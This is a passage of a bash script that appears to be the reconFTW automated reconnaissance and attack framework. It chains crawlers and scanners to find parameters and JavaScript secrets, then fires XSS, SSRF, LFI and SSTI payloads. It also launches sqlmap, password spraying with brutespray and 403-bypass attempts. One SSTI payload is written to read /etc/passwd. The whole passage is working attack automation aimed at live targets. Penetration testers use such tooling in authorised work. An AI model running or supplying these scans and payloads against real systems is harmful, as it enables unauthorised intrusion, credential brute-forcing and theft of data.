			cat .tmp/gospider/* | sed '/^.\{2048\}./d' | anew -q .tmp/gospider.txt
		fi
		cat .tmp/gospider.txt | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | grep ".$domain$" | anew -q .tmp/url_extract_tmp.txt
		if [ -s "${GITHUB_TOKENS}" ]; then
			github-endpoints -q -k -d $domain -t ${GITHUB_TOKENS} -o .tmp/github-endpoints.txt &>>"$LOGFILE"
			cat .tmp/github-endpoints.txt 2>>"$LOGFILE" | anew -q .tmp/url_extract_tmp.txt
		fi
		cat .tmp/url_extract_tmp.txt webs/param.txt 2>>"$LOGFILE" | grep "${domain}" | grep "=" | qsreplace -a 2>>"$LOGFILE" | grep -Eiv "\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|pdf|svg|txt|js)$" | anew -q .tmp/url_extract_tmp2.txt
		cat .tmp/url_extract_tmp.txt | grep "${domain}" | grep -Ei "\.(js)" | anew -q js/url_extract_js.txt
		uddup -u .tmp/url_extract_tmp2.txt -o .tmp/url_extract_uddup.txt &>>"$LOGFILE"
		NUMOFLINES=$(cat .tmp/url_extract_uddup.txt 2>>"$LOGFILE" | anew webs/url_extract.txt | wc -l)
		notification "${NUMOFLINES} new urls with params" info
		end_func "Results are saved in $domain/webs/url_extract.txt" ${FUNCNAME[0]}
		if [ "$PROXY" = true ] && [ -n "$proxy_url" ] && [[ $(cat webs/url_extract.txt | wc -l) -le 1500 ]]; then
			notification "Sending urls to proxy" info
			ffuf -mc all -w webs/url_extract.txt -u FUZZ -replay-proxy $proxy_url &>>"$LOGFILE"
		fi
	else
		printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
	fi
}

function url_gf(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$URL_GF" = true ]; then
		start_func "Vulnerable Pattern Search"
		mkdir -p gf
		gf xss webs/url_extract.txt | anew -q gf/xss.txt
		gf ssti webs/url_extract.txt | anew -q gf/ssti.txt
		gf ssrf webs/url_extract.txt | anew -q gf/ssrf.txt
		gf sqli webs/url_extract.txt | anew -q gf/sqli.txt
		gf redirect webs/url_extract.txt | anew -q gf/redirect.txt && cat gf/ssrf.txt | anew -q gf/redirect.txt
		gf rce webs/url_extract.txt | anew -q gf/rce.txt
		gf potential webs/url_extract.txt | cut -d ':' -f3-5 |anew -q gf/potential.txt
		cat .tmp/url_extract_tmp.txt | grep -Eiv "\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|pdf|svg|txt|js)$" | unfurl -u format %s://%d%p | anew -q gf/endpoints.txt
		gf lfi webs/url_extract.txt | anew -q gf/lfi.txt
		end_func "Results are saved in $domain/gf folder" ${FUNCNAME[0]}
	else
		if [ "$URL_GF" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function url_ext(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$URL_EXT" = true ]; then
		ext=("7z" "achee" "action" "adr" "apk" "arj" "ascx" "asmx" "asp" "aspx" "axd" "backup" "bak" "bat" "bin" "bkf" "bkp" "bok" "cab" "cer" "cfg" "cfm" "cfml" "cgi" "cnf" "conf" "config" "cpl" "crt" "csr" "csv" "dat" "db" "dbf" "deb" "dmg" "dmp" "doc" "docx" "drv" "email" "eml" "emlx" "env" "exe" "gadget" "gz" "html" "ica" "inf" "ini" "iso" "jar" "java" "jhtml" "json" "jsp" "key" "log" "lst" "mai" "mbox" "mbx" "md" "mdb" "msg" "msi" "nsf" "ods" "oft" "old" "ora" "ost" "pac" "passwd" "pcf" "pdf" "pem" "pgp" "php" "php3" "php4" "php5" "phtm" "phtml" "pkg" "pl" "plist" "pst" "pwd" "py" "rar" "rb" "rdp" "reg" "rpm" "rtf" "sav" "sh" "shtm" "shtml" "skr" "sql" "swf" "sys" "tar" "tar.gz" "tmp" "toast" "tpl" "txt" "url" "vcd" "vcf" "wml" "wpd" "wsdl" "wsf" "xls" "xlsm" "xlsx" "xml" "xsd" "yaml" "yml" "z" "zip")
		echo "" > webs/url_extract.txt
		for t in "${ext[@]}"; do
			NUMOFLINES=$(cat .tmp/url_extract_tmp.txt | grep -Ei "\.(${t})($|\/|\?)" | sort -u | wc -l)
			if [[ ${NUMOFLINES} -gt 0 ]]; then
				echo -e "\n############################\n + ${t} + \n############################\n" >> webs/urls_by_ext.txt
				cat .tmp/url_extract_tmp.txt | grep -Ei "\.(${t})($|\/|\?)" | sort -u >> webs/urls_by_ext.txt
			fi
		done
		end_func "Results are saved in $domain/webs/urls_by_ext.txt" ${FUNCNAME[0]}
	else
		if [ "$URL_EXT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function jschecks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$JSCHECKS" = true ]; then
		start_func "Javascript Scan"
		if [ -s "js/url_extract_js.txt" ]; then
			printf "${yellow} Running : Fetching Urls 1/5${reset}\n"
			cat js/url_extract_js.txt | cut -d '?' -f 1 | grep -iE "\.js$" | grep "$domain$" | anew -q js/jsfile_links.txt
			cat js/url_extract_js.txt | subjs | grep "$domain$" | anew -q js/jsfile_links.txt
			printf "${yellow} Running : Resolving JS Urls 2/5${reset}\n"
			axiom-scan js/jsfile_links.txt -m httpx -follow-redirects -random-agent -silent -timeout $HTTPX_TIMEOUT -threads $HTTPX_THREADS -status-code -retries 2 -no-color -o .tmp/js_livelinks.txt &>>"$LOGFILE" && cat .tmp/js_livelinks.txt | grep "[200]" | cut -d ' ' -f1 | anew -q js/js_livelinks.txt
			printf "${yellow} Running : Gathering endpoints 3/5${reset}\n"
			if [ -s "js/js_livelinks.txt" ]; then
				interlace -tL js/js_livelinks.txt -threads 10 -c "python3 $tools/LinkFinder/linkfinder.py -d -i _target_ -o cli >> .tmp/js_endpoints.txt" &>/dev/null
			fi
			if [ -s ".tmp/js_endpoints.txt" ]; then
				sed -i '/^\//!d' .tmp/js_endpoints.txt
				cat .tmp/js_endpoints.txt | anew -q js/js_endpoints.txt.txt
			fi
			printf "${yellow} Running : Gathering secrets 4/5${reset}\n"
			if [ -s "js/js_livelinks.txt" ]; then
				axiom-scan js/js_livelinks.txt -m nuclei -w /home/op/recon/nuclei/exposures/ -r /home/op/lists/resolvers_trusted.txt -o js/js_secrets.txt &>>"$LOGFILE"
			fi
			printf "${yellow} Running : Building wordlist 5/5${reset}\n"
			if [ -s "js/js_livelinks.txt" ]; then
				cat js/js_livelinks.txt | python3 $tools/getjswords.py 2>>"$LOGFILE" | anew -q webs/dict_words.txt
			fi
			end_func "Results are saved in $domain/js folder" ${FUNCNAME[0]}
		else
			end_func "No JS urls found for $domain, function skipped" ${FUNCNAME[0]}
		fi
	else
		if [ "$JSCHECKS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function wordlist_gen(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$WORDLIST" = true ];	then
		start_func "Wordlist generation"
		cat .tmp/url_extract_tmp.txt | unfurl -u keys | sed 's/[][]//g' | sed 's/[#]//g' | sed 's/[}{]//g' | anew -q webs/dict_words.txt
		cat .tmp/url_extract_tmp.txt | unfurl -u values | sed 's/[][]//g' | sed 's/[#]//g' | sed 's/[}{]//g' | anew -q webs/dict_words.txt
		cat .tmp/url_extract_tmp.txt | tr "[:punct:]" "\n" | anew -q webs/dict_words.txt
		if [ -s ".tmp/js_endpoints.txt" ]; then
			cat .tmp/js_endpoints.txt | unfurl -u path | anew -q webs/dict_paths.txt
		fi
		cat .tmp/url_extract_tmp.txt | unfurl -u path | anew -q webs/dict_paths.txt
		end_func "Results are saved in $domain/webs/dict_[words|paths].txt" ${FUNCNAME[0]}
	else
		if [ "$WORDLIST" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

###############################################################################################################
######################################### VULNERABILITIES #####################################################
###############################################################################################################

function brokenLinks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$BROKENLINKS" = true ] ; then
		start_func "Broken links checks"
		if [ ! -s ".tmp/gospider.txt" ]; then
			if [ "$DEEP" = true ]; then
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 3 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			else
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 2 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			fi
			cat .tmp/gospider/* | sed '/^.\{2048\}./d' | anew -q .tmp/gospider.txt
		fi
		cat .tmp/gospider.txt | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | sort -u | httpx -follow-redirects -random-agent -status-code -threads $HTTPX_THREADS -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color | grep "\[4" | cut -d ' ' -f1 | anew -q .tmp/brokenLinks_total.txt
		NUMOFLINES=$(cat .tmp/brokenLinks_total.txt 2>>"$LOGFILE" | anew webs/brokenLinks.txt | wc -l)
		notification "${NUMOFLINES} new broken links found" info
		end_func "Results are saved in webs/brokenLinks.txt" ${FUNCNAME[0]}
	else
		if [ "$BROKENLINKS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function xss(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$XSS" = true ] && [ -s "gf/xss.txt" ]; then
		start_func "XSS Analysis"
		cat gf/xss.txt | qsreplace FUZZ | Gxss -c 100 -p Xss | anew -q .tmp/xss_reflected.txt
		if [ "$DEEP" = true ]; then
			if [ -n "$XSS_SERVER" ]; then
				axiom-scan .tmp/xss_reflected.txt -m dalfox --mass --mass-worker 100 --multicast --skip-bav -b ${XSS_SERVER} -w $DALFOX_THREADS -o vulns/xss.txt &>>"$LOGFILE"
			else
				printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n"
				axiom-scan .tmp/xss_reflected.txt -m dalfox --mass --mass-worker 100 --multicast --skip-bav -w $DALFOX_THREADS -o vulns/xss.txt &>>"$LOGFILE"
			fi
		else
			if [[ $(cat .tmp/xss_reflected.txt | wc -l) -le 500 ]]; then
				if [ -n "$XSS_SERVER" ]; then
					axiom-scan .tmp/xss_reflected.txt -m dalfox --mass --mass-worker 100 --multicast --skip-bav --skip-grepping --skip-mining-all --skip-mining-dict -b ${XSS_SERVER} -w $DALFOX_THREADS -o vulns/xss.txt &>>"$LOGFILE"
				else
					printf "${yellow}\n No XSS_SERVER defined, blind xss skipped\n\n"
					axiom-scan .tmp/xss_reflected.txt -m dalfox --mass --mass-worker 100 --multicast --skip-bav --skip-grepping --skip-mining-all --skip-mining-dict -w $DALFOX_THREADS -o vulns/xss.txt &>>"$LOGFILE"
				fi
			else
				printf "${bred} Skipping XSS: Too Much URLs to test, try with --deep flag${reset}\n"
			fi
		fi
		end_func "Results are saved in vulns/xss.txt" ${FUNCNAME[0]}
	else
		if [ "$XSS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/xss.txt" ]; then
				printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to XSS ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function cors(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$CORS" = true ]; then
		start_func "CORS Scan"
		python3 $tools/Corsy/corsy.py -i webs/webs.txt > webs/cors.txt &>>"$LOGFILE"
		cat webs/cors.txt 2>>"$LOGFILE"
		end_func "Results are saved in webs/cors.txt" ${FUNCNAME[0]}
	else
		if [ "$CORS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function open_redirect(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$OPEN_REDIRECT" = true ] && [ -s "gf/redirect.txt" ]; then
		start_func "Open redirects checks"
		if [ "$DEEP" = true ]; then
			cat gf/redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
			python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt 2>>"$LOGFILE" | grep "^http" > vulns/redirect.txt
			sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" vulns/redirect.txt
			end_func "Results are saved in vulns/redirect.txt" ${FUNCNAME[0]}
		else
			if [[ $(cat gf/redirect.txt | wc -l) -le 1000 ]]; then
				cat gf/redirect.txt | qsreplace FUZZ | anew -q .tmp/tmp_redirect.txt
				python3 $tools/OpenRedireX/openredirex.py -l .tmp/tmp_redirect.txt --keyword FUZZ -p $tools/OpenRedireX/payloads.txt 2>>"$LOGFILE" | grep "^http" > vulns/redirect.txt
				sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" vulns/redirect.txt
				end_func "Results are saved in vulns/redirect.txt" ${FUNCNAME[0]}
			else
				printf "${bred} Skipping Open redirects: Too Much URLs to test, try with --deep flag${reset}\n"
				printf "${bgreen}#######################################################################${reset}\n"
			fi
		fi
	else
		if [ "$OPEN_REDIRECT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/redirect.txt" ]; then
			printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to Open Redirect ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function ssrf_checks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SSRF_CHECKS" = true ] && [ -s "gf/ssrf.txt" ]; then
		if [ -n "$COLLAB_SERVER" ]; then
			start_func "SSRF checks"
			if [ "$DEEP" = true ]; then
				cat gf/ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
				COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
				echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
				echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
				for url in $(cat .tmp/tmp_ssrf.txt); do
					ffuf -v -H "${HEADER}" -t $FFUF_THREADS -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssrf.txt
				done
				python3 $tools/ssrf.py $dir/gf/ssrf.txt $COLLAB_SERVER_FIX 2>>"$LOGFILE" | anew -q vulns/ssrf.txt
				end_func "Results are saved in vulns/ssrf.txt" ${FUNCNAME[0]}
			else
				if [[ $(cat gf/ssrf.txt | wc -l) -le 1000 ]]; then
					cat gf/ssrf.txt | qsreplace FUZZ | anew -q .tmp/tmp_ssrf.txt
					COLLAB_SERVER_FIX=$(echo $COLLAB_SERVER | sed -r "s/https?:\/\///")
					echo $COLLAB_SERVER_FIX | anew -q .tmp/ssrf_server.txt
					echo $COLLAB_SERVER | anew -q .tmp/ssrf_server.txt
					for url in $(cat .tmp/tmp_ssrf.txt); do
						ffuf -v -H "${HEADER}" -t $FFUF_THREADS -w .tmp/ssrf_server.txt -u $url &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssrf.txt
					done
					python3 $tools/ssrf.py $dir/gf/ssrf.txt $COLLAB_SERVER_FIX 2>>"$LOGFILE" | anew -q vulns/ssrf.txt
					end_func "Results are saved in vulns/ssrf.txt" ${FUNCNAME[0]}
				else
					printf "${bred} Skipping SSRF: Too Much URLs to test, try with --deep flag${reset}\n"
				fi
			fi
		else
			notification "No COLLAB_SERVER defined" error
			end_func "Skipping function" ${FUNCNAME[0]}
			printf "${bgreen}#######################################################################${reset}\n"
		fi
	else
		if [ "$SSRF_CHECKS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/ssrf.txt" ]; then
				printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to SSRF ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function crlf_checks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$CRLF_CHECKS" = true ]; then
		start_func "CRLF checks"
		crlfuzz -l webs/webs.txt -o vulns/crlf.txt &>>"$LOGFILE"
		end_func "Results are saved in vulns/crlf.txt" ${FUNCNAME[0]}
	else
		if [ "$CRLF_CHECKS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function lfi(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$LFI" = true ] && [ -s "gf/lfi.txt" ]; then
		start_func "LFI checks"
		cat gf/lfi.txt | qsreplace FUZZ | anew -q .tmp/tmp_lfi.txt
		for url in $(cat .tmp/tmp_lfi.txt); do
			ffuf -v -mc 200 -t $FFUF_THREADS -H "${HEADER}" -w $lfi_wordlist -u $url -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/lfi.txt
		done
		end_func "Results are saved in vulns/lfi.txt" ${FUNCNAME[0]}
	else
		if [ "$LFI" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/lfi.txt" ]; then
			printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to LFI ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function ssti(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SSTI" = true ] && [ -s "gf/ssti.txt" ]; then
		start_func "SSTI checks"
		cat gf/ssti.txt | qsreplace "ssti{{7*7}}" | anew -q .tmp/ssti_fuzz.txt
		ffuf -v -mc 200 -t $FFUF_THREADS -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "ssti49" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssti.txt
		cat gf/ssti.txt | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | anew -q .tmp/ssti_fuzz2.txt
		ffuf -v -mc 200 -t $FFUF_THREADS -H "${HEADER}" -w .tmp/ssti_fuzz.txt -u FUZZ -mr "root:" &>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q vulns/ssti.txt
		end_func "Results are saved in vulns/ssti.txt" ${FUNCNAME[0]}
	else
		if [ "$SSTI" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/ssti.txt" ]; then
			printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to SSTI ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function sqli(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SQLI" = true ] && [ -s "gf/sqli.txt" ]; then
		start_func "SQLi checks"
		cat gf/sqli.txt | qsreplace FUZZ | anew -q .tmp/tmp_sqli.txt
		interlace -tL .tmp/tmp_sqli.txt -threads 10 -c "python3 $tools/sqlmap/sqlmap.py -u _target_ -b --batch --disable-coloring --random-agent --output-dir=sqlmap" &>/dev/null
		end_func "Results are saved in sqlmap folder" ${FUNCNAME[0]}
	else
		if [ "$SQLI" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		elif [ ! -s "gf/sqli.txt" ]; then
			printf "\n${yellow} ${FUNCNAME[0]} No URLs potentially vulnerables to SQLi ${reset}\n\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function test_ssl(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$TEST_SSL" = true ]; then
		start_func "SSL Test"
		$tools/testssl.sh/testssl.sh --quiet --color 0 -U -iL hosts/ips.txt 2>>"$LOGFILE" > hosts/testssl.txt
		end_func "Results are saved in hosts/testssl.txt" ${FUNCNAME[0]}
	else
		if [ "$TEST_SSL" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function spraying(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SPRAY" = true ]; then
		start_func "Password spraying"
		cd "$tools/brutespray" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		python3 brutespray.py --file $dir/hosts/portscan_active.txt --threads $BRUTESPRAY_THREADS --hosts $BRUTESPRAY_CONCURRENCE -o $dir/hosts/brutespray.txt &>>"$LOGFILE"
		cd "$dir" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		end_func "Results are saved in hosts/brutespray.txt" ${FUNCNAME[0]}
	else
		if [ "$SPRAY" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function 4xxbypass(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$BYPASSER4XX" = true ]; then
		start_func "403 bypass"
		cat fuzzing/*.txt 2>>"$LOGFILE" | grep -E '^4' | grep -Ev '^404' | cut -d ' ' -f3 | dirdar -only-ok > .tmp/dirdar.txt
		cat .tmp/dirdar.txt  2>>"$LOGFILE" | sed -e '1,12d' | sed '/^$/d' | anew -q vulns/4xxbypass.txt
		end_func "Results are saved in vulns/4xxbypass.txt" ${FUNCNAME[0]}
	else
		if [ "$BYPASSER4XX" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

###############################################################################################################
########################################## OPTIONS & MGMT #####################################################
###############################################################################################################

function deleteOutScoped(){
	if [ -z "$1" ]; then
		cat $1 | while read outscoped
		do
			if  grep -q  "^[*]" <<< $outscoped
			then
				outscoped="${outscoped:1}"
				sed -i /"$outscoped$"/d  $2
			else
			sed -i /$outscoped/d  $2
			fi
		done
	fi
}

function getElapsedTime {
	runtime=""
	local T=$2-$1
	local D=$((T/60/60/24))
	local H=$((T/60/60%24))
	local M=$((T/60%60))
	local S=$((T%60))
	(( $D > 0 )) && runtime="$runtime$D days, "
	(( $H > 0 )) && runtime="$runtime$H hours, "
	(( $M > 0 )) && runtime="$runtime$M minutes, "
	runtime="$runtime$S seconds."
}

function zipSnedOutputFolder {
	zip_name=`date +"%Y_%m_%d-%H.%M.%S"`
	zip_name="$zip_name"_"$domain.zip"
	cd $SCRIPTPATH && zip -r $zip_name $dir &>/dev/null
	if [ -f "$SCRIPTPATH/$zip_name" ]; then
		sendToNotify "$SCRIPTPATH/$zip_name"
		rm -f "$SCRIPTPATH/$zip_name"
	else
		notification "No Zip file to send" warn
	fi
}

function isAsciiText {
	IS_ASCII="False";
	if [[ $(file $1 | grep -o 'ASCII text$') == "ASCII text" ]]; then
		IS_ASCII="True";
	else
		IS_ASCII="False";
	fi
}

function output(){
	mkdir -p $dir_output
	mv $dir $dir_output
}

function notification(){
	if [ -n "$1" ] && [ -n "$2" ]; then
		case $2 in
			info)
				text="\n${bblue} ${1} ${reset}"
				printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
			;;
			warn)
				text="\n${yellow} ${1} ${reset}"
				printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
			;;
			error)
				text="\n${bred} ${1} ${reset}"
				printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
			;;
			good)
				text="\n${bgreen} ${1} ${reset}"
				printf "${text}\n" && printf "${text} - ${domain}\n" | $NOTIFY
			;;
		esac
	fi
}

function sendToNotify {

	if [[ -z "$1" ]]; then
		printf "\n${yellow} no file provided to send ${reset}\n"
	else
		if [[ -z "$NOTIFY_CONFIG" ]]; then
			NOTIFY_CONFIG=~/.config/notify/notify.conf
		fi
		if grep -q '^ telegram\|^telegram' $NOTIFY_CONFIG ; then
			notification "Sending ${domain} data over Telegram" info
			telegram_chat_id=$(cat ${NOTIFY_CONFIG} | grep '^ telegram_chat_id\|^telegram_chat_id' | xargs | cut -d' ' -f2)
			telegram_key=$(cat ${NOTIFY_CONFIG} | grep '^ telegram_apikey\|^telegram_apikey' | xargs | cut -d' ' -f2 )
			curl -F document=@${1} "https://api.telegram.org/bot${telegram_key}/sendDocument?chat_id=${telegram_chat_id}" &>/dev/null
		fi
		if grep -q '^ discord\|^discord' $NOTIFY_CONFIG ; then
			notification "Sending ${domain} data over Discord" info
			discord_url=$(cat ${NOTIFY_CONFIG} | grep '^ discord_webhook_url\|^discord_webhook_url' | xargs | cut -d' ' -f2)
			curl -v -i -H "Accept: application/json" -H "Content-Type: multipart/form-data" -X POST -F file1=@${1} $discord_url &>/dev/null
		fi
		if [[ -n "$slack_channel" ]] && [[ -n "$slack_auth" ]]; then
			notification "Sending ${domain} data over Slack" info
			curl -F file=@${1} -F "initial_comment=reconftw zip file" -F channels=${slack_channel} -H "Authorization: Bearer ${slack_auth}" https://slack.com/api/files.upload &>/dev/null
		fi
	fi
}

function start_func(){
	printf "${bgreen}#######################################################################"
	notification "${1}" info
	start=$(date +%s)
}

function end_func(){
	touch $called_fn_dir/.${2}
	end=$(date +%s)
	getElapsedTime $start $end
	notification "${2} Finished in ${runtime}" info
	printf "${bblue} ${1} ${reset}\n"
	printf "${bgreen}#######################################################################${reset}\n"
}

function start_subfunc(){
	notification "${1}" warn
	start_sub=$(date +%s)
}

function end_subfunc(){
	touch $called_fn_dir/.${2}
	end_sub=$(date +%s)
	getElapsedTime $start_sub $end_sub
	notification "${1} in ${runtime}" good
}

function resolvers_update(){
	if [ "$update_resolvers" = true ]; then
		notification "Checking resolvers lists...\n Accurate resolvers are the key to great results\n This may take around 10 minutes if it's not updated" warn
		# shellcheck disable=SC2016
		axiom-exec 'if [ \$(find "/home/op/lists/resolvers.txt" -mtime +1 -print) ] || [ \$(cat /home/op/lists/resolvers.txt | wc -l) -le 40 ] ; then dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 200 -o /home/op/lists/resolvers.txt ; fi' &>/dev/null
		notification "Updated\n" good
		axiom-exec 'wget -O /home/op/lists/resolvers_trusted.txt https://gist.githubusercontent.com/six2dez/ae9ed7e5c786461868abd3f2344401b6/raw' &>/dev/null
		update_resolvers=false
	fi
	
}

function axiom_lauch(){
